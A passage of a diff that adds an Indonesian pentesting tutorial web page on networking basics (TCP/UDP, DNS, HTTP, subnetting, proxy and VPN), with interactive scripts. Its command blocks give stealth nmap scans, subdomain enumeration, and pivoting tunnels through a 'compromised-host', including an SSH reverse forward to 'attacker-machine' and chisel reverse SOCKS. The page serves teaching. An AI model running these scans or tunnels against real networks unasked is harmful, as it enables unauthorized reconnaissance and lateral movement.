@@ -1,0 +1,1041 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Networking Fundamentals - Panduan Lengkap</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+
+        header {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2rem;
+            text-align: center;
+            border-bottom: 2px solid #0f3460;
+        }
+
+        header h1 {
+            font-size: 2.5rem;
+            color: #00d4ff;
+            margin-bottom: 0.5rem;
+            text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
+        }
+
+        header p {
+            color: #a0a0a0;
+            font-size: 1.1rem;
+        }
+
+        nav {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            padding: 1.5rem;
+            background: rgba(0, 0, 0, 0.2);
+            border-bottom: 1px solid #0f3460;
+        }
+
+        nav button {
+            padding: 0.8rem 1.5rem;
+            background: #0f3460;
+            color: #e0e0e0;
+            border: 2px solid #00d4ff;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        nav button:hover, nav button.active {
+            background: #00d4ff;
+            color: #1a1a2e;
+            box-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 2rem;
+        }
+
+        .section {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: rgba(15, 52, 96, 0.3);
+            border: 1px solid #0f3460;
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            backdrop-filter: blur(10px);
+        }
+
+        .card h2 {
+            color: #00d4ff;
+            margin-bottom: 1rem;
+            font-size: 1.8rem;
+        }
+
+        .card h3 {
+            color: #4ecdc4;
+            margin: 1.5rem 0 1rem 0;
+            font-size: 1.3rem;
+        }
+
+        .card p {
+            line-height: 1.8;
+            margin-bottom: 1rem;
+        }
+
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .comparison-table th, .comparison-table td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid #0f3460;
+        }
+
+        .comparison-table th {
+            background: #0f3460;
+            color: #00d4ff;
+            font-weight: bold;
+        }
+
+        .comparison-table tr:hover {
+            background: rgba(0, 212, 255, 0.1);
+        }
+
+        .code-block {
+            background: #0a0a0a;
+            border: 1px solid #0f3460;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            color: #4ecdc4;
+        }
+
+        .visualization {
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid #0f3460;
+            border-radius: 12px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+            text-align: center;
+        }
+
+        .handshake-container {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            margin: 2rem 0;
+            position: relative;
+        }
+
+        .device {
+            background: #0f3460;
+            padding: 1.5rem 2rem;
+            border-radius: 8px;
+            border: 2px solid #00d4ff;
+            font-weight: bold;
+            min-width: 120px;
+        }
+
+        .packet {
+            position: absolute;
+            background: #4ecdc4;
+            color: #1a1a2e;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9rem;
+            opacity: 0;
+            transition: all 0.5s;
+        }
+
+        .packet.animate {
+            opacity: 1;
+        }
+
+        .btn {
+            background: #00d4ff;
+            color: #1a1a2e;
+            border: none;
+            padding: 0.8rem 2rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            transition: all 0.3s;
+            margin: 0.5rem;
+        }
+
+        .btn:hover {
+            background: #4ecdc4;
+            box-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
+            transform: translateY(-2px);
+        }
+
+        .example-box {
+            background: rgba(78, 205, 196, 0.1);
+            border-left: 4px solid #4ecdc4;
+            padding: 1rem 1.5rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+
+        .example-box strong {
+            color: #4ecdc4;
+        }
+
+        .dns-record {
+            display: inline-block;
+            background: #0f3460;
+            padding: 0.5rem 1rem;
+            margin: 0.3rem;
+            border-radius: 20px;
+            border: 1px solid #00d4ff;
+            font-family: monospace;
+        }
+
+        .status-code {
+            display: inline-block;
+            padding: 0.3rem 0.8rem;
+            border-radius: 4px;
+            font-weight: bold;
+            margin: 0.2rem;
+        }
+
+        .status-2xx { background: #2d5016; color: #4ecdc4; }
+        .status-3xx { background: #504d16; color: #ffd93d; }
+        .status-4xx { background: #501616; color: #ff6b6b; }
+        .status-5xx { background: #3d1650; color: #c44ecd; }
+
+        .subnet-calculator {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 1rem 0;
+        }
+
+        .subnet-calculator input {
+            background: #0a0a0a;
+            border: 1px solid #0f3460;
+            color: #e0e0e0;
+            padding: 0.5rem;
+            border-radius: 4px;
+            margin: 0.5rem;
+            font-family: monospace;
+        }
+
+        .result {
+            background: rgba(0, 212, 255, 0.1);
+            border: 1px solid #00d4ff;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            font-family: monospace;
+        }
+
+        ul, ol {
+            margin-left: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        li {
+            margin: 0.5rem 0;
+            line-height: 1.6;
+        }
+
+        .highlight {
+            color: #00d4ff;
+            font-weight: bold;
+        }
+
+        .warning {
+            background: rgba(255, 107, 107, 0.1);
+            border-left: 4px solid #ff6b6b;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+
+        .info {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 4px solid #00d4ff;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+
+        @media (max-width: 768px) {
+            header h1 { font-size: 1.8rem; }
+            nav { flex-direction: column; }
+            .handshake-container { flex-direction: column; gap: 2rem; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Networking Fundamentals</h1>
+        <p>Panduan Lengkap Konsep Jaringan untuk Pentesting & Security</p>
+    </header>
+
+    <nav>
+        <button class="nav-btn active" data-section="tcp-udp">TCP vs UDP</button>
+        <button class="nav-btn" data-section="dns">DNS</button>
+        <button class="nav-btn" data-section="http">HTTP/HTTPS</button>
+        <button class="nav-btn" data-section="subnetting">Subnetting & Routing</button>
+        <button class="nav-btn" data-section="proxy-vpn">Proxy & VPN</button>
+    </nav>
+
+    <div class="container">
+        <div id="tcp-udp" class="section active">
+            <div class="card">
+                <h2>TCP vs UDP - Transport Layer Protocols</h2>
+                <p>Protokol transport layer bertanggung jawab untuk mengirim data antar aplikasi. Dua protokol utama adalah <span class="highlight">TCP (Transmission Control Protocol)</span> dan <span class="highlight">UDP (User Datagram Protocol)</span>.</p>
+
+                <h3>Perbandingan TCP vs UDP</h3>
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Fitur</th>
+                            <th>TCP</th>
+                            <th>UDP</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Koneksi</td>
+                            <td>Connection-oriented (ada handshake)</td>
+                            <td>Connectionless (tanpa handshake)</td>
+                        </tr>
+                        <tr>
+                            <td>Keandalan</td>
+                            <td>Reliable - menjamin pengiriman</td>
+                            <td>Unreliable - tidak ada jaminan</td>
+                        </tr>
+                        <tr>
+                            <td>Urutan</td>
+                            <td>Menjaga urutan paket</td>
+                            <td>Tidak menjaga urutan</td>
+                        </tr>
+                        <tr>
+                            <td>Kecepatan</td>
+                            <td>Lebih lambat (overhead)</td>
+                            <td>Lebih cepat (minimal overhead)</td>
+                        </tr>
+                        <tr>
+                            <td>Header Size</td>
+                            <td>20 bytes</td>
+                            <td>8 bytes</td>
+                        </tr>
+                        <tr>
+                            <td>Use Case</td>
+                            <td>Web, Email, File Transfer</td>
+                            <td>Streaming, Gaming, DNS</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>TCP Three-Way Handshake</h3>
+                <p>TCP menggunakan proses 3 langkah untuk membangun koneksi yang reliable:</p>
+                
+                <div class="visualization">
+                    <div class="handshake-container" id="handshake-viz">
+                        <div class="device">Client</div>
+                        <div class="device">Server</div>
+                    </div>
+                    <button class="btn" onclick="startHandshake()">Mulai Handshake</button>
+                    <button class="btn" onclick="resetHandshake()">Reset</button>
+                    <div id="handshake-log" style="margin-top: 1rem; text-align: left; font-family: monospace;"></div>
+                </div>
+
+                <div class="example-box">
+                    <strong>Contoh TCP Handshake:</strong><br>
+                    1. <span class="highlight">SYN</span>: Client mengirim SYN ke Server (Port 80)<br>
+                    2. <span class="highlight">SYN-ACK</span>: Server membalas dengan SYN-ACK<br>
+                    3. <span class="highlight">ACK</span>: Client mengirim ACK, koneksi established
+                </div>
+
+                <h3>Hubungan dengan Port Scanning</h3>
+                <p>Memahami TCP handshake sangat penting untuk <span class="highlight">port scanning</span>:</p>
+                <ul>
+                    <li><strong>SYN Scan (Stealth Scan)</strong>: Mengirim SYN, jika dapat SYN-ACK = port open, jika RST = port closed</li>
+                    <li><strong>Connect Scan</strong>: Melakukan full TCP handshake</li>
+                    <li><strong>UDP Scan</strong>: Mengirim UDP packet, jika tidak ada response = port open/filtered</li>
+                </ul>
+
+                <div class="code-block">
+# Contoh Nmap SYN Scan
+nmap -sS 192.168.1.1
+
+# Contoh Nmap UDP Scan
+nmap -sU 192.168.1.1
+
+# Contoh Nmap Full Connect Scan
+nmap -sT 192.168.1.1
+                </div>
+
+                <div class="info">
+                    <strong>Tips Pentesting:</strong> SYN scan lebih stealth karena tidak menyelesaikan handshake, sehingga tidak tercatat di log aplikasi.
+                </div>
+            </div>
+        </div>
+
+        <div id="dns" class="section">
+            <div class="card">
+                <h2>DNS - Domain Name System</h2>
+                <p>DNS adalah sistem yang menerjemahkan nama domain (seperti google.com) menjadi alamat IP (seperti 142.250.195.78). Memahami DNS sangat penting untuk <span class="highlight">subdomain enumeration</span> dan reconnaissance.</p>
+
+                <h3>Jenis-jenis DNS Record</h3>
+                
+                <h4>A Record (Address Record)</h4>
+                <p>Memetakan nama domain ke alamat IPv4</p>
+                <div class="example-box">
+                    <strong>Contoh:</strong><br>
+                    <span class="dns-record">example.com -> 93.184.216.34</span><br>
+                    <span class="dns-record">www.example.com -> 93.184.216.34</span>
+                </div>
+
+                <h4>CNAME Record (Canonical Name)</h4>
+                <p>Alias dari satu domain ke domain lain</p>
+                <div class="example-box">
+                    <strong>Contoh:</strong><br>
+                    <span class="dns-record">www.example.com -> example.com</span><br>
+                    <span class="dns-record">blog.example.com -> blogs.wordpress.com</span>
+                </div>
+
+                <h4>MX Record (Mail Exchange)</h4>
+                <p>Menentukan server email untuk domain</p>
+                <div class="example-box">
+                    <strong>Contoh:</strong><br>
+                    <span class="dns-record">example.com -> mail.example.com (priority: 10)</span><br>
+                    <span class="dns-record">example.com -> backup-mail.example.com (priority: 20)</span>
+                </div>
+
+                <h4>TXT Record (Text Record)</h4>
+                <p>Menyimpan informasi teks, sering untuk verifikasi dan SPF/DKIM</p>
+                <div class="example-box">
+                    <strong>Contoh:</strong><br>
+                    <span class="dns-record">v=spf1 include:_spf.google.com ~all</span><br>
+                    <span class="dns-record">google-site-verification=abc123xyz</span>
+                </div>
+
+                <h4>NS Record (Name Server)</h4>
+                <p>Menentukan server DNS yang authoritative untuk domain</p>
+                <div class="example-box">
+                    <strong>Contoh:</strong><br>
+                    <span class="dns-record">example.com -> ns1.cloudflare.com</span><br>
+                    <span class="dns-record">example.com -> ns2.cloudflare.com</span>
+                </div>
+
+                <h3>Subdomain Enumeration</h3>
+                <p>Subdomain enumeration adalah proses menemukan subdomain dari target domain. Ini penting untuk menemukan attack surface yang tersembunyi.</p>
+
+                <div class="code-block">
+# Menggunakan dig untuk query DNS
+dig example.com A
+dig example.com MX
+dig example.com TXT
+dig example.com NS
+
+# Menggunakan nslookup
+nslookup example.com
+nslookup -type=MX example.com
+
+# Subdomain enumeration tools
+subfinder -d example.com
+amass enum -d example.com
+                </div>
+
+                <h3>Teknik Subdomain Enumeration</h3>
+                <ol>
+                    <li><strong>Brute Force</strong>: Mencoba subdomain umum (www, mail, ftp, admin, dev, staging)</li>
+                    <li><strong>DNS Zone Transfer</strong>: Mencoba AXFR request (jarang berhasil)</li>
+                    <li><strong>Certificate Transparency</strong>: Mencari di crt.sh untuk SSL certificates</li>
+                    <li><strong>Passive Recon</strong>: Menggunakan search engine dan OSINT</li>
+                    <li><strong>Permutation</strong>: Membuat variasi dari subdomain yang ditemukan</li>
+                </ol>
+
+                <div class="warning">
+                    <strong>Peringatan:</strong> Selalu dapatkan izin sebelum melakukan subdomain enumeration pada domain yang bukan milik Anda!
+                </div>
+            </div>
+        </div>
+
+        <div id="http" class="section">
+            <div class="card">
+                <h2>HTTP/HTTPS - Hypertext Transfer Protocol</h2>
+                <p>HTTP adalah protokol aplikasi untuk transfer data di web. HTTPS adalah versi secure dengan enkripsi TLS/SSL.</p>
+
+                <h3>HTTP Request Methods</h3>
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Method</th>
+                            <th>Fungsi</th>
+                            <th>Contoh Use Case</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><span class="highlight">GET</span></td>
+                            <td>Mengambil data</td>
+                            <td>Load halaman, ambil resource</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">POST</span></td>
+                            <td>Mengirim data untuk diproses</td>
+                            <td>Submit form, upload file</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">PUT</span></td>
+                            <td>Update/mengganti resource</td>
+                            <td>Update data user</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">DELETE</span></td>
+                            <td>Menghapus resource</td>
+                            <td>Hapus account, hapus file</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">PATCH</span></td>
+                            <td>Update parsial resource</td>
+                            <td>Update satu field saja</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">HEAD</span></td>
+                            <td>Sama seperti GET tapi tanpa body</td>
+                            <td>Cek metadata, validasi URL</td>
+                        </tr>
+                        <tr>
+                            <td><span class="highlight">OPTIONS</span></td>
+                            <td>Cek method yang didukung</td>
+                            <td>CORS preflight request</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>HTTP Status Codes</h3>
+                <div class="example-box">
+                    <strong>2xx - Success:</strong><br>
+                    <span class="status-code status-2xx">200 OK</span>
+                    <span class="status-code status-2xx">201 Created</span>
+                    <span class="status-code status-2xx">204 No Content</span>
+                </div>
+                <div class="example-box">
+                    <strong>3xx - Redirection:</strong><br>
+                    <span class="status-code status-3xx">301 Moved Permanently</span>
+                    <span class="status-code status-3xx">302 Found</span>
+                    <span class="status-code status-3xx">304 Not Modified</span>
+                </div>
+                <div class="example-box">
+                    <strong>4xx - Client Error:</strong><br>
+                    <span class="status-code status-4xx">400 Bad Request</span>
+                    <span class="status-code status-4xx">401 Unauthorized</span>
+                    <span class="status-code status-4xx">403 Forbidden</span>
+                    <span class="status-code status-4xx">404 Not Found</span>
+                </div>
+                <div class="example-box">
+                    <strong>5xx - Server Error:</strong><br>
+                    <span class="status-code status-5xx">500 Internal Server Error</span>
+                    <span class="status-code status-5xx">502 Bad Gateway</span>
+                    <span class="status-code status-5xx">503 Service Unavailable</span>
+                </div>
+
+                <h3>HTTP Headers</h3>
+                <div class="code-block">
+# Request Headers
+GET /api/users HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Accept: application/json
+Authorization: Bearer token123
+Cookie: session_id=abc123; user=john
+Content-Type: application/json
+
+# Response Headers
+HTTP/1.1 200 OK
+Content-Type: application/json
+Set-Cookie: session_id=xyz789; HttpOnly; Secure
+X-Powered-By: Express
+Server: nginx/1.18.0
+                </div>
+
+                <h3>Cookie & Session</h3>
+                <p><span class="highlight">Cookie</span> adalah data kecil yang disimpan di browser client. <span class="highlight">Session</span> adalah data yang disimpan di server.</p>
+
+                <div class="example-box">
+                    <strong>Cookie Attributes:</strong><br>
+                    - <span class="highlight">HttpOnly</span>: Tidak bisa diakses via JavaScript (mencegah XSS)<br>
+                    - <span class="highlight">Secure</span>: Hanya dikirim via HTTPS<br>
+                    - <span class="highlight">SameSite</span>: Mencegah CSRF (Strict, Lax, None)<br>
+                    - <span class="highlight">Expires/Max-Age</span>: Waktu kedaluwarsa
+                </div>
+
+                <div class="code-block">
+# Contoh Set-Cookie
+Set-Cookie: session_id=abc123; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
+
+# Contoh Session ID di URL (tidak recommended)
+https://example.com/dashboard?session_id=abc123
+                </div>
+
+                <h3>HTTPS & TLS</h3>
+                <p>HTTPS menggunakan TLS (Transport Layer Security) untuk enkripsi:</p>
+                <ol>
+                    <li><strong>TLS Handshake</strong>: Client dan server negotiate encryption</li>
+                    <li><strong>Certificate Verification</strong>: Client verifikasi SSL certificate server</li>
+                    <li><strong>Key Exchange</strong>: Pertukaran symmetric key</li>
+                    <li><strong>Encrypted Communication</strong>: Semua data dienkripsi</li>
+                </ol>
+
+                <div class="info">
+                    <strong>Security Tips:</strong><br>
+                    - Selalu gunakan HTTPS untuk data sensitif<br>
+                    - Set cookie dengan HttpOnly, Secure, dan SameSite<br>
+                    - Implementasi HSTS (HTTP Strict Transport Security)<br>
+                    - Gunakan strong TLS versions (TLS 1.2+)
+                </div>
+            </div>
+        </div>
+
+        <div id="subnetting" class="section">
+            <div class="card">
+                <h2>Subnetting & Routing</h2>
+                <p>Subnetting adalah proses membagi network besar menjadi network-network kecil. Routing adalah proses menentukan jalur untuk mengirim paket data.</p>
+
+                <h3>CIDR Notation</h3>
+                <p>CIDR (Classless Inter-Domain Routing) menggunakan notasi /n untuk menunjukkan jumlah bit network:</p>
+
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>CIDR</th>
+                            <th>Subnet Mask</th>
+                            <th>Total IPs</th>
+                            <th>Usable IPs</th>
+                            <th>Use Case</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>/32</td>
+                            <td>255.255.255.255</td>
+                            <td>1</td>
+                            <td>1</td>
+                            <td>Single host</td>
+                        </tr>
+                        <tr>
+                            <td>/30</td>
+                            <td>255.255.255.252</td>
+                            <td>4</td>
+                            <td>2</td>
+                            <td>Point-to-point link</td>
+                        </tr>
+                        <tr>
+                            <td>/28</td>
+                            <td>255.255.255.240</td>
+                            <td>16</td>
+                            <td>14</td>
+                            <td>Small network</td>
+                        </tr>
+                        <tr>
+                            <td>/24</td>
+                            <td>255.255.255.0</td>
+                            <td>256</td>
+                            <td>254</td>
+                            <td>Standard LAN</td>
+                        </tr>
+                        <tr>
+                            <td>/16</td>
+                            <td>255.255.0.0</td>
+                            <td>65,536</td>
+                            <td>65,534</td>
+                            <td>Large network</td>
+                        </tr>
+                        <tr>
+                            <td>/8</td>
+                            <td>255.0.0.0</td>
+                            <td>16,777,216</td>
+                            <td>16,777,214</td>
+                            <td>Very large network</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Subnet Calculator</h3>
+                <div class="subnet-calculator">
+                    <input type="text" id="ip-input" placeholder="192.168.1.0" value="192.168.1.0">
+                    <input type="text" id="cidr-input" placeholder="/24" value="/24">
+                    <button class="btn" onclick="calculateSubnet()">Calculate</button>
+                    <div id="subnet-result" class="result"></div>
+                </div>
+
+                <h3>Gateway & Router</h3>
+                <p><span class="highlight">Gateway</span> adalah node yang menjadi pintu keluar/masuk dari satu network ke network lain. Biasanya adalah router.</p>
+
+                <div class="example-box">
+                    <strong>Contoh Konfigurasi:</strong><br>
+                    Network: 192.168.1.0/24<br>
+                    Gateway: 192.168.1.1<br>
+                    DNS: 8.8.8.8, 8.8.4.4<br>
+                    DHCP Range: 192.168.1.100 - 192.168.1.200
+                </div>
+
+                <h3>NAT (Network Address Translation)</h3>
+                <p>NAT memungkinkan multiple device di private network menggunakan satu public IP untuk akses internet.</p>
+
+                <h4>Jenis-jenis NAT:</h4>
+                <ul>
+                    <li><strong>Static NAT</strong>: One-to-one mapping (private IP to public IP)</li>
+                    <li><strong>Dynamic NAT</strong>: Many-to-many mapping dari pool public IP</li>
+                    <li><strong>PAT (Port Address Translation)</strong>: Many-to-one mapping menggunakan port berbeda</li>
+                </ul>
+
+                <div class="code-block">
+# Contoh NAT Configuration (Cisco Router)
+ip nat inside source list 1 interface GigabitEthernet0/0 overload
+
+access-list 1 permit 192.168.1.0 0.0.0.255
+
+interface GigabitEthernet0/0
+  ip nat outside
+
+interface GigabitEthernet0/1
+  ip nat inside
+                </div>
+
+                <h3>Penting untuk Network Pentesting</h3>
+                <ul>
+                    <li><strong>Network Discovery</strong>: Memahami subnet untuk menemukan host</li>
+                    <li><strong>Pivoting</strong>: Menggunakan compromised host untuk akses network lain</li>
+                    <li><strong>Lateral Movement</strong>: Bergerak antar subnet dalam network</li>
+                    <li><strong>Route Manipulation</strong>: Mengubah routing untuk intercept traffic</li>
+                </ul>
+
+                <div class="info">
+                    <strong>Pentesting Tip:</strong> Gunakan tools seperti ip route, traceroute, dan nmap untuk mapping network topology.
+                </div>
+            </div>
+        </div>
+
+        <div id="proxy-vpn" class="section">
+            <div class="card">
+                <h2>Proxy & VPN</h2>
+                <p>Proxy dan VPN adalah tools untuk anonymization, bypassing restrictions, dan pivoting dalam network pentesting.</p>
+
+                <h3>Proxy Server</h3>
+                <p>Proxy adalah intermediary server yang menerima request dari client dan meneruskannya ke destination.</p>
+
+                <h4>Jenis-jenis Proxy:</h4>
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Jenis</th>
+                            <th>Layer</th>
+                            <th>Fungsi</th>
+                            <th>Use Case</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>HTTP Proxy</strong></td>
+                            <td>Application (L7)</td>
+                            <td>Intercept HTTP/HTTPS traffic</td>
+                            <td>Web testing, filtering</td>
+                        </tr>
+                        <tr>
+                            <td><strong>SOCKS Proxy</strong></td>
+                            <td>Session (L5)</td>
+                            <td>Forward any TCP/UDP traffic</td>
+                            <td>General purpose proxy</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Transparent Proxy</strong></td>
+                            <td>Network (L3/L4)</td>
+                            <td>Intercept tanpa konfigurasi client</td>
+                            <td>Content filtering</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Reverse Proxy</strong></td>
+                            <td>Application (L7)</td>
+                            <td>Forward request ke backend servers</td>
+                            <td>Load balancing, security</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="code-block">
+# Menggunakan HTTP Proxy dengan curl
+curl -x http://proxy.example.com:8080 https://target.com
+
+# Menggunakan SOCKS proxy
+curl --socks5 localhost:1080 https://target.com
+
+# Konfigurasi environment variable
+export http_proxy=http://proxy.example.com:8080
+export https_proxy=http://proxy.example.com:8080
+
+# Menggunakan proxychains
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
+proxychains nmap -sT target.com
+                </div>
+
+                <h3>VPN (Virtual Private Network)</h3>
+                <p>VPN membuat encrypted tunnel antara client dan server, mengenkripsi semua traffic.</p>
+
+                <h4>VPN Protocols:</h4>
+                <ul>
+                    <li><strong>OpenVPN</strong>: Open source, flexible, secure</li>
+                    <li><strong>WireGuard</strong>: Modern, fast, lightweight</li>
+                    <li><strong>IPSec</strong>: Network layer, sering untuk site-to-site</li>
+                    <li><strong>L2TP/IPSec</strong>: Layer 2 tunneling dengan IPSec encryption</li>
+                    <li><strong>SSTP</strong>: Microsoft proprietary, works through firewalls</li>
+                </ul>
+
+                <div class="example-box">
+                    <strong>VPN Use Cases dalam Pentesting:</strong><br>
+                    - <span class="highlight">Remote Access</span>: Akses network client dari remote location<br>
+                    - <span class="highlight">Anonymization</span>: Hide real IP address<br>
+                    - <span class="highlight">Pivoting</span>: Access internal network through compromised host<br>
+                    - <span class="highlight">Bypassing Geo-restrictions</span>: Access region-locked resources
+                </div>
+
+                <h3>Traffic Routing dengan Proxy/VPN</h3>
+                <div class="visualization">
+                    <div style="display: flex; justify-content: space-around; align-items: center; margin: 2rem 0;">
+                        <div class="device">Your Device<br><small>192.168.1.100</small></div>
+                        <div style="font-size: 2rem;">-></div>
+                        <div class="device">VPN/Proxy<br><small>Encrypted Tunnel</small></div>
+                        <div style="font-size: 2rem;">-></div>
+                        <div class="device">Target Server<br><small>203.0.113.50</small></div>
+                    </div>
+                </div>
+
+                <h3>Pivoting Techniques</h3>
+                <p>Pivoting menggunakan compromised host sebagai jump point untuk akses network lain:</p>
+
+                <div class="code-block">
+# SSH Tunneling (Local Port Forwarding)
+ssh -L 8080:internal-server:80 user@compromised-host
+
+# SSH Tunneling (Remote Port Forwarding)
+ssh -R 2222:localhost:22 user@attacker-machine
+
+# SSH Dynamic Port Forwarding (SOCKS Proxy)
+ssh -D 1080 user@compromised-host
+
+# Chisel (HTTP tunneling)
+# Server side (compromised host):
+chisel server -p 8080 --reverse
+# Client side (your machine):
+chisel client compromised-host:8080 R:1080:socks
+
+# Using proxychains with pivoting
+proxychains nmap -sT 10.0.0.0/24
+                </div>
+
+                <h3>Proxy vs VPN Comparison</h3>
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Feature</th>
+                            <th>Proxy</th>
+                            <th>VPN</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Encryption</td>
+                            <td>Optional (HTTPS only)</td>
+                            <td>Full encryption</td>
+                        </tr>
+                        <tr>
+                            <td>Scope</td>
+                            <td>Application-specific</td>
+                            <td>All traffic</td>
+                        </tr>
+                        <tr>
+                            <td>Speed</td>
+                            <td>Faster (less overhead)</td>
+                            <td>Slower (encryption overhead)</td>
+                        </tr>
+                        <tr>
+                            <td>Use Case</td>
+                            <td>Web testing, bypassing</td>
+                            <td>Full anonymization, secure access</td>
+                        </tr>
+                        <tr>
+                            <td>Configuration</td>
+                            <td>Per-application</td>
+                            <td>System-wide</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="warning">
+                    <strong>Legal Notice:</strong> Penggunaan proxy dan VPN untuk aktivitas ilegal adalah tindakan kriminal. Selalu gunakan dengan izin dan untuk tujuan yang legal.
+                </div>
+
+                <div class="info">
+                    <strong>Pentesting Best Practices:</strong><br>
+                    - Gunakan VPN untuk melindungi traffic saat pentesting remote<br>
+                    - Implementasi proxy chaining untuk anonymity<br>
+                    - Dokumentasi semua pivot points dan routes<br>
+                    - Test connectivity sebelum engagement
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.querySelectorAll('.nav-btn').forEach(button => {
+            button.addEventListener('click', () => {
+                document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+                document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
+                
+                button.classList.add('active');
+                const sectionId = button.getAttribute('data-section');
+                document.getElementById(sectionId).classList.add('active');
+            });
+        });
+
+        let packets = [];
+
+        function startHandshake() {
+            resetHandshake();
+            const container = document.getElementById('handshake-viz');
+            const log = document.getElementById('handshake-log');
+            
+            setTimeout(() => {
+                const syn = document.createElement('div');
+                syn.className = 'packet';
+                syn.textContent = 'SYN';
+                syn.style.left = '20%';
+                syn.style.top = '50%';
+                container.appendChild(syn);
+                
+                setTimeout(() => {
+                    syn.style.left = '70%';
+                    syn.classList.add('animate');
+                    log.innerHTML += '<div style="color: #4ecdc4;">Client sends SYN (Seq=0)</div>';
+                }, 100);
+                
+                packets.push(syn);
+            }, 500);
+
+            setTimeout(() => {
+                const synack = document.createElement('div');
+                synack.className = 'packet';
+                synack.textContent = 'SYN-ACK';
+                synack.style.left = '70%';
+                synack.style.top = '60%';
+                container.appendChild(synack);
+                
+                setTimeout(() => {
+                    synack.style.left = '20%';
+                    synack.classList.add('animate');
+                    log.innerHTML += '<div style="color: #ffd93d;">Server responds SYN-ACK (Seq=0, Ack=1)</div>';
+                }, 100);
+                
+                packets.push(synack);
+            }, 2000);
+
+            setTimeout(() => {
+                const ack = document.createElement('div');
+                ack.className = 'packet';
+                ack.textContent = 'ACK';
+                ack.style.left = '20%';
+                ack.style.top = '70%';
+                container.appendChild(ack);
+                
+                setTimeout(() => {
+                    ack.style.left = '70%';
+                    ack.classList.add('animate');
+                    log.innerHTML += '<div style="color: #00d4ff;">Client sends ACK (Ack=1)</div>';
+                    log.innerHTML += '<div style="color: #4ecdc4; margin-top: 1rem; font-weight: bold;">Connection Established!</div>';
+                }, 100);
+                
+                packets.push(ack);
+            }, 3500);
+        }
+
+        function resetHandshake() {
+            packets.forEach(packet => packet.remove());
+            packets = [];
+            document.getElementById('handshake-log').innerHTML = '';
+        }
+
+        function calculateSubnet() {
+            const ip = document.getElementById('ip-input').value;
+            const cidr = document.getElementById('cidr-input').value.replace('/', '');
+            
+            if (!ip || !cidr) {
+                document.getElementById('subnet-result').innerHTML = '<span style="color: #ff6b6b;">Please enter valid IP and CIDR</span>';
+                return;
+            }
+
+            const parts = ip.split('.').map(Number);
